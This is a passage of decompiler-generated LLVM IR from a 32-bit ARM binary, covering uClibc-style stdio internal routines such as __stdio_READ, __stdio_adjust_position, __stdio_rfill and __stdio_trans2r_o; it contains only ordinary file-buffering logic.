  store i32 %v0_1883c, i32* %v3_1883c, align 4
  %v0_18840 = load i32, i32* %r2.global-to-local, align 4
  %v1_18840 = load i32, i32* @r5, align 4
  %v2_18840 = add i32 %v1_18840, 20
  %v3_18840 = inttoptr i32 %v2_18840 to i32*
  store i32 %v0_18840, i32* %v3_18840, align 4
  %v0_18844 = load i32, i32* %r2.global-to-local, align 4
  %v1_18844 = load i32, i32* @r5, align 4
  %v2_18844 = add i32 %v1_18844, 24
  %v3_18844 = inttoptr i32 %v2_18844 to i32*
  store i32 %v0_18844, i32* %v3_18844, align 4
  %v0_18848 = load i32, i32* %r0.global-to-local, align 4
  %v1_18848 = load i32, i32* @r5, align 4
  %v2_18848 = add i32 %v1_18848, 44
  %v3_18848 = inttoptr i32 %v2_18848 to i32*
  store i32 %v0_18848, i32* %v3_18848, align 4
  br label %dec_label_pc_18854

dec_label_pc_18850:                               ; preds = %dec_label_pc_187d0, %dec_label_pc_187fc, %dec_label_pc_187e8
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18854

dec_label_pc_18854:                               ; preds = %dec_label_pc_18814, %dec_label_pc_18850
  %v0_18854 = load i32, i32* %r7.global-to-local, align 4
  %v2_18854 = icmp eq i32 %v0_18854, 0
  br i1 %v2_18854, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_18854
  store i32 %v2_18760, i32* %r0.global-to-local, align 4
  store i32 90076, i32* %r3.global-to-local, align 4
  store i32 100460, i32* @lr, align 4
  call void @__pseudo_branch(i32 90076)
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_18854, %dec_label_pc_18770, %bb
  %v0_1886c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1886c, i32* %r0.global-to-local, align 4
  store i32 %v3_18758, i32* @r4, align 4
  store i32 %v6_18758, i32* @r5, align 4
  store i32 %v9_18758, i32* @r6, align 4
  ret i32 %v0_1886c

; uselistorder directives
  uselistorder i32 %v0_187fc, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 9, 8, 11, 0, 10, 12 }
  uselistorder i32 ()* @__pthread_return_0, { 36, 23, 22, 21, 20, 19, 18, 17, 4, 35, 46, 45, 15, 3, 2, 1, 43, 42, 41, 40, 14, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 16, 29, 28, 27, 31, 30, 39, 26, 38, 37, 44, 25, 24, 34, 33, 32 }
  uselistorder i32 ptrtoint (i8* @global_var_15fd4.997 to i32), { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__pthread_return_void, { 42, 39, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 1, 0, 41, 40, 49, 48, 47, 46, 3, 2, 5, 4, 28, 27, 26, 25, 24, 32, 31, 30, 29, 45, 23, 44, 43, 22, 21, 20, 19, 38, 37, 36, 35, 34, 33 }
  uselistorder i32 90076, { 0, 6, 7, 8, 9, 1, 10, 11, 12, 2, 3, 4, 5, 13 }
  uselistorder i32 52, { 5, 2, 7, 3, 4, 1, 8, 6, 9, 0 }
  uselistorder i32 22, { 3, 12, 4, 11, 5, 6, 7, 16, 13, 8, 14, 0, 15, 9, 10, 1, 2, 17 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18854, { 1, 0 }
  uselistorder label %dec_label_pc_18850, { 1, 2, 0 }
  uselistorder label %dec_label_pc_187fc, { 1, 0 }
  uselistorder label %dec_label_pc_187c4, { 1, 0 }
}

define i32 @__stdio_READ(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18888 = load i32, i32* @r4, align 4
  store i32 %v3_18888, i32* %stack_var_-12, align 4
  %v3_1888c = load i8, i8* %arg1, align 1
  %v4_1888c = zext i8 %v3_1888c to i32
  store i32 %v4_1888c, i32* %r3.global-to-local, align 4
  %v1_18890 = and i32 %v4_1888c, 4
  store i32 %v1_18890, i32* %r5.global-to-local, align 4
  %v2_18890 = icmp eq i32 %v1_18890, 0
  store i1 %v2_18890, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v2_18890, label %bb8, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_18888, i32* @r4, align 4
  ret i32 0

bb8:                                              ; preds = %entry
  %v1_188a0 = icmp slt i32 %arg2, 0
  %v2_188a0 = icmp eq i32 %arg2, 0
  store i1 %v2_188a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_188a0, label %bb9, label %bb10

bb9:                                              ; preds = %bb8
  store i32 2147483647, i32* @r2, align 4
  br label %bb10

bb10:                                             ; preds = %bb8, %bb9
  %v1_188a8 = add i32 %tmp, 4
  %v2_188a8 = inttoptr i32 %v1_188a8 to i32*
  %v3_188a8 = load i32, i32* %v2_188a8, align 4
  store i32 %v3_188a8, i32* %r0.global-to-local, align 4
  %v1_188ac = call i32 @__libc_read(i32 %v3_188a8)
  store i32 %v1_188ac, i32* %r0.global-to-local, align 4
  %v2_188b0 = icmp eq i32 %v1_188ac, 0
  store i1 %v2_188b0, i1* %cpsr_z.global-to-local, align 1
  %tmp11 = icmp slt i32 %v1_188ac, 1
  br i1 %tmp11, label %bb13, label %bb12

bb12:                                             ; preds = %bb10
  %v7_188b4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v7_188b4, i32* @r4, align 4
  ret i32 %v1_188ac

bb13:                                             ; preds = %bb10
  %v0_188b8 = load i32, i32* @r4, align 4
  %v1_188b8 = inttoptr i32 %v0_188b8 to i32*
  %v2_188b8 = load i32, i32* %v1_188b8, align 4
  %v1_188bc = or i32 %v2_188b8, 8
  store i32 %v1_188bc, i32* %r1.global-to-local, align 4
  %v1_188c0 = or i32 %v2_188b8, 4
  store i32 %v1_188c0, i32* %r3.global-to-local, align 4
  %v3_188c4 = sdiv i32 %v2_188b8, 256
  store i32 %v3_188c4, i32* %ip.global-to-local, align 4
  br i1 %v2_188b0, label %.thread, label %bb14

bb14:                                             ; preds = %bb13
  %v1_188cc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_188cc, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread:                                          ; preds = %bb13
  %v2_188d0 = trunc i32 %v3_188c4 to i8
  %v4_188d0 = add i32 %v0_188b8, 1
  %v5_188d0 = inttoptr i32 %v4_188d0 to i8*
  store i8 %v2_188d0, i8* %v5_188d0, align 1
  %v0_188d4.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_188d4.pr, label %.thread1, label %.thread2

.thread1:                                         ; preds = %.thread
  %v1_188d4 = load i32, i32* %r3.global-to-local, align 4
  %v2_188d4 = trunc i32 %v1_188d4 to i8
  %v3_188d4 = load i32, i32* @r4, align 4
  %v4_188d4 = inttoptr i32 %v3_188d4 to i8*
  store i8 %v2_188d4, i8* %v4_188d4, align 1
  %v0_188d8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_188d8.pr.pr, label %.thread3, label %.thread2

.thread2:                                         ; preds = %bb14, %.thread, %.thread1
  %v1_188d8 = load i32, i32* %ip.global-to-local, align 4
  %v2_188d8 = trunc i32 %v1_188d8 to i8
  %v3_188d8 = load i32, i32* @r4, align 4
  %v4_188d8 = add i32 %v3_188d8, 1
  %v5_188d8 = inttoptr i32 %v4_188d8 to i8*
  store i8 %v2_188d8, i8* %v5_188d8, align 1
  %v0_188dc.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_188dc.pr, label %.thread3, label %bb15

bb15:                                             ; preds = %.thread2
  %v1_188dc = load i32, i32* %r1.global-to-local, align 4
  %v2_188dc = trunc i32 %v1_188dc to i8
  %v3_188dc = load i32, i32* @r4, align 4
  %v4_188dc = inttoptr i32 %v3_188dc to i8*
  store i8 %v2_188dc, i8* %v4_188dc, align 1
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %.thread2, %bb15
  %v2_188e0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_188e0, i32* @r4, align 4
  %v11_188e0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_188e0

; uselistorder directives
  uselistorder i32 %v3_188c4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 1, 5, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 (i32)* @__libc_read, { 1, 0 }
  uselistorder i32 2147483647, { 2, 3, 0, 1 }
  uselistorder label %.thread3, { 2, 1, 0 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_adjust_position(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_188e4 = load i32, i32* @r4, align 4
  store i32 %v3_188e4, i32* %stack_var_-16, align 4
  %v2_188e8 = add i32 %tmp, 1
  %v3_188e8 = inttoptr i32 %v2_188e8 to i8*
  %v4_188e8 = load i8, i8* %v3_188e8, align 1
  %v5_188e8 = zext i8 %v4_188e8 to i32
  %v3_188ec = load i8, i8* %arg1, align 1
  %v4_188ec = zext i8 %v3_188ec to i32
  store i32 %v4_188ec, i32* %r2.global-to-local, align 4
  %v4_188f0 = mul nuw nsw i32 %v5_188e8, 256
  %v5_188f0 = or i32 %v4_188ec, %v4_188f0
  store i32 %v5_188f0, i32* @lr, align 4
  %tmp15 = urem i8 %v3_188ec, 4
  %v2_188f4 = icmp eq i8 %tmp15, 0
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_188f4, label %bb, label %dec_label_pc_18904

bb:                                               ; preds = %entry
  br label %.thread

dec_label_pc_18904:                               ; preds = %entry
  %v1_188f4 = zext i8 %tmp15 to i32
  %v1_18904 = add nsw i32 %v1_188f4, -1
  %v7_18904 = icmp eq i8 %tmp15, 1
  br i1 %v7_18904, label %.thread, label %dec_label_pc_1890c

dec_label_pc_1890c:                               ; preds = %dec_label_pc_18904
  %v1_1890c = and i32 %v4_188f0, 2048
  %v2_1890c = icmp eq i32 %v1_1890c, 0
  br i1 %v2_1890c, label %.thread, label %dec_label_pc_18914

dec_label_pc_18914:                               ; preds = %dec_label_pc_1890c
  %v8_18918 = icmp sgt i32 %v1_18904, 1
  br i1 %v8_18918, label %dec_label_pc_189a4, label %dec_label_pc_1891c

dec_label_pc_1891c:                               ; preds = %dec_label_pc_18914
  %v2_1891c = add i32 %tmp, 40
  %v3_1891c = inttoptr i32 %v2_1891c to i32*
  %v4_1891c = load i32, i32* %v3_1891c, align 4
  %v2_18920 = icmp eq i32 %v4_1891c, 0
  br i1 %v2_18920, label %dec_label_pc_18928, label %dec_label_pc_189a4

dec_label_pc_18928:                               ; preds = %dec_label_pc_1891c
  %v2_18928 = add i32 %tmp, 3
  %v3_18928 = inttoptr i32 %v2_18928 to i8*
  %v4_18928 = load i8, i8* %v3_18928, align 1
  %v5_18928 = zext i8 %v4_18928 to i32
  %v2_1892c = add i32 %tmp, 44
  %v3_1892c = inttoptr i32 %v2_1892c to i32*
  %v4_1892c = load i32, i32* %v3_1892c, align 4
  store i32 %v4_1892c, i32* %r2.global-to-local, align 4
  %v2_18930 = sub nsw i32 %v1_18904, %v5_18928
  %v1_18938 = add nsw i32 %v2_18930, -1
  %tmp11 = icmp slt i32 %v4_1892c, 1
  br i1 %tmp11, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_18928
  %v7_1893c = add i32 %tmp, 2
  %v8_1893c = inttoptr i32 %v7_1893c to i8*
  %v9_1893c = load i8, i8* %v8_1893c, align 1
  %v10_1893c = zext i8 %v9_1893c to i32
  %v7_18940 = sub nsw i32 %v1_18938, %v10_1893c
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_18928, %bb, %dec_label_pc_1890c, %dec_label_pc_18904, %bb12
  %v0_1895c = phi i32 [ %v1_18904, %dec_label_pc_1890c ], [ %v1_18904, %dec_label_pc_18904 ], [ 0, %bb ], [ %v7_18940, %bb12 ], [ %v1_18938, %dec_label_pc_18928 ]
  %v1_18944 = and i32 %v4_188ec, 64
  %v2_18944 = icmp eq i32 %v1_18944, 0
  %storemerge.in.in.v = select i1 %v2_18944, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_18950 = add i32 %tmp, 16
  %v3_18950 = inttoptr i32 %v2_18950 to i32*
  %v4_18950 = load i32, i32* %v3_18950, align 4
  %v2_18954 = sub i32 %storemerge, %v4_18950
  %v1_18958 = inttoptr i32 %arg2 to i32*
  %v2_18958 = load i32, i32* %v1_18958, align 4
  store i32 %v2_18958, i32* %r1.global-to-local, align 4
  %v3_18958 = add i32 %arg2, 4
  %v4_18958 = inttoptr i32 %v3_18958 to i32*
  %v5_18958 = load i32, i32* %v4_18958, align 4
  store i32 %v5_18958, i32* %r2.global-to-local, align 4
  %v2_1895c = add i32 %v2_18954, %v0_1895c
  store i32 %v2_1895c, i32* %r5.global-to-local, align 4
  %v2_18960 = sub i32 %v2_18958, %v2_1895c
  %v2_18964 = and i32 %v2_1895c, 1073741824
  %v3_18964 = icmp ne i32 %v2_18964, 0
  %v6_18964 = icmp eq i1 %v3_18964, false
  %tmp16 = icmp slt i32 %v2_1895c, 0
  %v4_18964.neg = zext i1 %tmp16 to i32
  %v7_18964 = add i32 %v5_18958, %v4_18964.neg
  %v9_18964 = sext i1 %v6_18964 to i32
  %v10_18964 = add i32 %v7_18964, %v9_18964
  store i32 %v10_18964, i32* %r4.global-to-local, align 4
  store i32 %v2_18960, i32* %v1_18958, align 4
  %v5_18968 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18968, i32* %v4_18958, align 4
  %v0_1896c = load i32, i32* %r6.global-to-local, align 4
  %v1_1896c = add i32 %v0_1896c, 4
  %v2_1896c = inttoptr i32 %v1_1896c to i32*
  %v3_1896c = load i32, i32* %v2_1896c, align 4
  %v1_18970 = load i32, i32* %r2.global-to-local, align 4
  %v8_18974 = icmp sgt i32 %v3_1896c, %v1_18970
  br i1 %v8_18974, label %dec_label_pc_18988, label %dec_label_pc_18978

dec_label_pc_18978:                               ; preds = %.thread
  %v9_18970 = icmp eq i32 %v3_1896c, %v1_18970
  br i1 %v9_18970, label %dec_label_pc_1897c, label %dec_label_pc_1898cthread-pre-split

dec_label_pc_1897c:                               ; preds = %dec_label_pc_18978
  %v1_1897c = inttoptr i32 %v0_1896c to i32*
  %v2_1897c = load i32, i32* %v1_1897c, align 4
  %v1_18980 = load i32, i32* %r1.global-to-local, align 4
  %tmp17 = icmp ugt i32 %v2_1897c, %v1_18980
  br i1 %tmp17, label %dec_label_pc_18988, label %dec_label_pc_1898cthread-pre-split

dec_label_pc_18988:                               ; preds = %dec_label_pc_1897c, %.thread
  %v0_18988 = load i32, i32* %r5.global-to-local, align 4
  %v1_18988 = sub i32 0, %v0_18988
  store i32 %v1_18988, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1898c

dec_label_pc_1898cthread-pre-split:               ; preds = %dec_label_pc_1897c, %dec_label_pc_18978
  %v0_1898c.pr = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1898c

dec_label_pc_1898c:                               ; preds = %dec_label_pc_1898cthread-pre-split, %dec_label_pc_18988
  %v0_1898c = phi i32 [ %v0_1898c.pr, %dec_label_pc_1898cthread-pre-split ], [ %v1_18988, %dec_label_pc_18988 ]
  %v1_1898c = icmp slt i32 %v0_1898c, 0
  br i1 %v1_1898c, label %dec_label_pc_18994, label %dec_label_pc_189a8

dec_label_pc_18994:                               ; preds = %dec_label_pc_1898c
  %v0_18994 = call i32 @__errno_location()
  %v2_1899c = inttoptr i32 %v0_18994 to i32*
  store i32 75, i32* %v2_1899c, align 4
  %v0_189a8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_189a8

dec_label_pc_189a4:                               ; preds = %dec_label_pc_1891c, %dec_label_pc_18914
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_189a8

dec_label_pc_189a8:                               ; preds = %dec_label_pc_1898c, %dec_label_pc_18994, %dec_label_pc_189a4
  %v0_189a8 = phi i32 [ %v0_1898c, %dec_label_pc_1898c ], [ %v0_189a8.pre, %dec_label_pc_18994 ], [ -1, %dec_label_pc_189a4 ]
  %v2_189ac = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_189ac, i32* @r4, align 4
  ret i32 %v0_189a8

; uselistorder directives
  uselistorder i32 %v1_18970, { 1, 0 }
  uselistorder i32 %v3_1896c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i8 %tmp15, { 0, 2, 1 }
  uselistorder i32 %v4_188ec, { 1, 0, 2 }
  uselistorder i32 %tmp, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32 1073741824, { 2, 3, 0, 1 }
  uselistorder i32 2048, { 2, 3, 4, 5, 1, 6, 7, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_189a8, { 2, 1, 0 }
  uselistorder label %.thread, { 4, 0, 2, 3, 1 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_189b0 = load i32, i32* @r4, align 4
  store i32 %v3_189b0, i32* %stack_var_-8, align 4
  %v1_189b4 = add i32 %arg1, 8
  %v1_189b8 = inttoptr i32 %v1_189b4 to i32*
  %v2_189b8 = load i32, i32* %v1_189b8, align 4
  store i32 %v2_189b8, i32* @r1, align 4
  %v3_189b8 = add i32 %arg1, 12
  %v4_189b8 = inttoptr i32 %v3_189b8 to i32*
  %v5_189b8 = load i32, i32* %v4_189b8, align 4
  %v2_189bc = sub i32 %v5_189b8, %v2_189b8
  store i32 %v2_189bc, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_189c4 = inttoptr i32 %arg1 to i8*
  %v4_189c4 = call i32 @__stdio_READ(i8* %v3_189c4, i32 %v2_189b8, i32 %v2_189bc)
  %v0_189c8 = load i32, i32* @r4, align 4
  %v1_189c8 = add i32 %v0_189c8, 8
  %v2_189c8 = inttoptr i32 %v1_189c8 to i32*
  %v3_189c8 = load i32, i32* %v2_189c8, align 4
  store i32 %v3_189c8, i32* %r2.global-to-local, align 4
  %v2_189cc = add i32 %v3_189c8, %v4_189c4
  %v2_189d0 = add i32 %v0_189c8, 20
  %v3_189d0 = inttoptr i32 %v2_189d0 to i32*
  store i32 %v2_189cc, i32* %v3_189d0, align 4
  %v0_189d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_189d4 = load i32, i32* @r4, align 4
  %v2_189d4 = add i32 %v1_189d4, 16
  %v3_189d4 = inttoptr i32 %v2_189d4 to i32*
  store i32 %v0_189d4, i32* %v3_189d4, align 4
  %v2_189d8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_189d8, i32* @r4, align 4
  ret i32 %v4_189c4

; uselistorder directives
  uselistorder i32 %v4_189c4, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_189dc = load i32, i32* @r4, align 4
  store i32 %v3_189dc, i32* %stack_var_-12, align 4
  %v0_189e0 = load i32, i32* @r0, align 4
  %v1_189e0 = inttoptr i32 %v0_189e0 to i8*
  %v2_189e0 = load i8, i8* %v1_189e0, align 1
  %v3_189e0 = zext i8 %v2_189e0 to i32
  store i32 %v3_189e0, i32* %r2.global-to-local, align 4
  %v1_189e4 = add i32 %v0_189e0, 1
  %v2_189e4 = inttoptr i32 %v1_189e4 to i8*
  %v3_189e4 = load i8, i8* %v2_189e4, align 1
  %v4_189e4 = zext i8 %v3_189e4 to i32
  store i32 %v4_189e4, i32* %r3.global-to-local, align 4
  %v4_189e8 = mul nuw nsw i32 %v4_189e4, 256
  %v5_189e8 = or i32 %v4_189e8, %v3_189e0
  store i32 %v5_189e8, i32* %r2.global-to-local, align 4
  %v1_189ec = load i32, i32* @r1, align 4
  %v2_189ec = and i32 %v1_189ec, %v5_189e8
  %v4_189ec = icmp eq i32 %v2_189ec, 0
  store i32 %v0_189e0, i32* @r4, align 4
  br i1 %v4_189ec, label %dec_label_pc_189f8, label %dec_label_pc_18a10

dec_label_pc_189f8:                               ; preds = %entry
  %v1_189f8 = and i32 %v5_189e8, 2176
  %v2_189f8 = icmp eq i32 %v1_189f8, 0
  br i1 %v2_189f8, label %dec_label_pc_18a00, label %dec_label_pc_18a24

dec_label_pc_18a00:                               ; preds = %dec_label_pc_189f8
  %v2_18a00 = or i32 %v1_189ec, %v5_189e8
  store i32 %v2_18a00, i32* %r2.global-to-local, align 4
  %v3_18a04 = sdiv i32 %v2_18a00, 256
  store i32 %v3_18a04, i32* %r3.global-to-local, align 4
  %v1_18a08 = trunc i32 %v3_18a04 to i8
  store i8 %v1_18a08, i8* %v2_189e4, align 1
  %v0_18a0c = load i32, i32* %r2.global-to-local, align 4
  %v1_18a0c = trunc i32 %v0_18a0c to i8
  %v2_18a0c = load i32, i32* @r0, align 4
  %v3_18a0c = inttoptr i32 %v2_18a0c to i8*
  store i8 %v1_18a0c, i8* %v3_18a0c, align 1
  %v0_18a10.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18a10

dec_label_pc_18a10:                               ; preds = %entry, %dec_label_pc_18a00
  %v0_18a10 = phi i32 [ %v0_189e0, %entry ], [ %v0_18a10.pre, %dec_label_pc_18a00 ]
  %v1_18a10 = inttoptr i32 %v0_18a10 to i8*
  %v2_18a10 = load i8, i8* %v1_18a10, align 1
  %v3_18a10 = zext i8 %v2_18a10 to i32
  store i32 %v3_18a10, i32* %r2.global-to-local, align 4
  %v1_18a14 = add i32 %v0_18a10, 1
  %v2_18a14 = inttoptr i32 %v1_18a14 to i8*
  %v3_18a14 = load i8, i8* %v2_18a14, align 1
  %v4_18a14 = zext i8 %v3_18a14 to i32
  %v4_18a18 = mul nuw nsw i32 %v4_18a14, 256
  %v5_18a18 = or i32 %v4_18a18, %v3_18a10
  store i32 %v5_18a18, i32* %r3.global-to-local, align 4
  %v1_18a1c = and i32 %v3_18a10, 16
  store i32 %v1_18a1c, i32* %r5.global-to-local, align 4
  %v2_18a1c = icmp eq i32 %v1_18a1c, 0
  br i1 %v2_18a1c, label %dec_label_pc_18a4c, label %dec_label_pc_18a24

dec_label_pc_18a24:                               ; preds = %dec_label_pc_189f8, %dec_label_pc_18a10
  %v0_18a24 = call i32 @__errno_location()
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_18a2c = inttoptr i32 %v0_18a24 to i32*
  store i32 9, i32* %v2_18a2c, align 4
  br label %dec_label_pc_18a30

dec_label_pc_18a30:                               ; preds = %dec_label_pc_18a54, %dec_label_pc_18a24
  %v0_18a30 = load i32, i32* @r4, align 4
  %v1_18a30 = inttoptr i32 %v0_18a30 to i32*
  %v2_18a30 = load i32, i32* %v1_18a30, align 4
  %v1_18a34 = or i32 %v2_18a30, 8
  store i32 %v1_18a34, i32* %r3.global-to-local, align 4
  %v3_18a38 = sdiv i32 %v2_18a30, 256
  store i32 %v3_18a38, i32* %r2.global-to-local, align 4
  %v1_18a40 = trunc i32 %v3_18a38 to i8
  %v3_18a40 = add i32 %v0_18a30, 1
  %v4_18a40 = inttoptr i32 %v3_18a40 to i8*
  store i8 %v1_18a40, i8* %v4_18a40, align 1
  %v0_18a44 = load i32, i32* %r3.global-to-local, align 4
  %v1_18a44 = trunc i32 %v0_18a44 to i8
  %v2_18a44 = load i32, i32* @r4, align 4
  %v3_18a44 = inttoptr i32 %v2_18a44 to i8*
  store i8 %v1_18a44, i8* %v3_18a44, align 1
  %v2_18a48 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18a48, i32* @r4, align 4
  ret i32 -1

dec_label_pc_18a4c:                               ; preds = %dec_label_pc_18a10
  %v1_18a4c = and i32 %v3_18a10, 64
  %v2_18a4c = icmp eq i32 %v1_18a4c, 0
  br i1 %v2_18a4c, label %dec_label_pc_18a7c, label %dec_label_pc_18a54

dec_label_pc_18a54:                               ; preds = %dec_label_pc_18a4c
  %v0_18a54 = call i32 @__stdio_wcommit()
  %v2_18a58 = icmp eq i32 %v0_18a54, 0
  br i1 %v2_18a58, label %dec_label_pc_18a60, label %dec_label_pc_18a30

dec_label_pc_18a60:                               ; preds = %dec_label_pc_18a54
  %v0_18a60 = load i32, i32* @r4, align 4
  %v1_18a60 = inttoptr i32 %v0_18a60 to i32*
  %v2_18a60 = load i32, i32* %v1_18a60, align 4
  store i32 %v2_18a60, i32* %r3.global-to-local, align 4
  %v1_18a64 = add i32 %v0_18a60, 8
  %v2_18a64 = inttoptr i32 %v1_18a64 to i32*
  %v3_18a64 = load i32, i32* %v2_18a64, align 4
  store i32 %v3_18a64, i32* %r2.global-to-local, align 4
  %v1_18a68 = and i32 %v2_18a60, -65
  store i32 %v1_18a68, i32* %r3.global-to-local, align 4
  %v3_18a6c = sdiv i32 %v2_18a60, 256
  store i32 %v3_18a6c, i32* %r1.global-to-local, align 4
  %v2_18a70 = add i32 %v0_18a60, 28
  %v3_18a70 = inttoptr i32 %v2_18a70 to i32*
  store i32 %v3_18a64, i32* %v3_18a70, align 4
  %v0_18a74 = load i32, i32* %r1.global-to-local, align 4
  %v1_18a74 = trunc i32 %v0_18a74 to i8
  %v2_18a74 = load i32, i32* @r4, align 4
  %v3_18a74 = add i32 %v2_18a74, 1
  %v4_18a74 = inttoptr i32 %v3_18a74 to i8*
  store i8 %v1_18a74, i8* %v4_18a74, align 1
  %v0_18a78 = load i32, i32* %r3.global-to-local, align 4
  %v1_18a78 = trunc i32 %v0_18a78 to i8
  %v2_18a78 = load i32, i32* @r4, align 4
  %v3_18a78 = inttoptr i32 %v2_18a78 to i8*
  store i8 %v1_18a78, i8* %v3_18a78, align 1
  %v0_18a7c.pre = load i32, i32* @r4, align 4
  %v0_18a88.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_18a7c

dec_label_pc_18a7c:                               ; preds = %dec_label_pc_18a4c, %dec_label_pc_18a60
  %v0_18a88 = phi i32 [ 0, %dec_label_pc_18a4c ], [ %v0_18a88.pre, %dec_label_pc_18a60 ]
  %v2_18a8c = phi i32 [ %v0_18a10, %dec_label_pc_18a4c ], [ %v0_18a7c.pre, %dec_label_pc_18a60 ]
  %v1_18a7c = inttoptr i32 %v2_18a8c to i32*
  %v2_18a7c = load i32, i32* %v1_18a7c, align 4
  %v1_18a80 = or i32 %v2_18a7c, 1
  store i32 %v1_18a80, i32* %r3.global-to-local, align 4
  %v3_18a84 = sdiv i32 %v2_18a7c, 256
  store i32 %v3_18a84, i32* %r2.global-to-local, align 4
  %v1_18a8c = trunc i32 %v3_18a84 to i8
  %v3_18a8c = add i32 %v2_18a8c, 1
  %v4_18a8c = inttoptr i32 %v3_18a8c to i8*
  store i8 %v1_18a8c, i8* %v4_18a8c, align 1
  %v0_18a90 = load i32, i32* %r3.global-to-local, align 4
  %v1_18a90 = trunc i32 %v0_18a90 to i8
  %v2_18a90 = load i32, i32* @r4, align 4
  %v3_18a90 = inttoptr i32 %v2_18a90 to i8*
  store i8 %v1_18a90, i8* %v3_18a90, align 1
  %v2_18a94 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18a94, i32* @r4, align 4
  ret i32 %v0_18a88

; uselistorder directives
  uselistorder i32 %v3_18a84, { 1, 0 }
  uselistorder i32 %v3_18a38, { 1, 0 }
  uselistorder i32 %v3_18a10, { 1, 2, 0, 3 }
  uselistorder i32 %v0_18a10, { 0, 2, 1 }
  uselistorder i32 %v3_18a04, { 1, 0 }
  uselistorder i32 %v5_189e8, { 0, 2, 1, 3 }
  uselistorder i32 ()* @__stdio_wcommit, { 4, 5, 1, 0, 3, 2 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder label %dec_label_pc_18a7c, { 1, 0 }
  uselistorder label %dec_label_pc_18a24, { 1, 0 }
  uselistorder label %dec_label_pc_18a10, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
